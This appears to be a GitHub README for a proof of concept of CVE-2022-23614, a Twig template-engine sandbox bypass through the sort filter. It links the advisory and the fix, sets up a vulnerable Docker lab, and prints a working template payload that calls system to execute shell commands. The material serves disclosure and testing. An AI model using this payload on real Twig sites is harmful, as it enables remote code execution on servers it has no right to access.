# CVE-2022-23614
PoC for [CVE-2022-23614](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23614), [GHSA-5mv2-rx3q-4w2v](https://github.com/twigphp/Twig/security/advisories/GHSA-5mv2-rx3q-4w2v) (Twig sort filter code execution/sandbox bypass)

As seen in this commit - [https://github.com/twigphp/Twig/commit/..](https://github.com/twigphp/Twig/commit/22b9dc3c03ee66d7e21d9ed2ca76052b134cb9e9), twig was passing user supplied function name as a callback parameter to [uasort](https://www.php.net/manual/en/function.uasort.php) ([here](https://github.com/twigphp/Twig/commit/22b9dc3c03ee66d7e21d9ed2ca76052b134cb9e9#diff-29e85e483c6ec4a9c2fd144820b6722c86df60d54175b355d85e806253313c1aR940)), thus leading to arbitrary code execution

To build and run the docker container with  a vulnerable twig version
```BASH
$ ./build-docker.sh
```

Open the webpage at localhost:1337 and try rendering the following payload

```Twig
{{ ['id','']|sort('system') }}
```

PoC
![PoC](/images/webpage.png)

Result
![Result](/images/result.png)
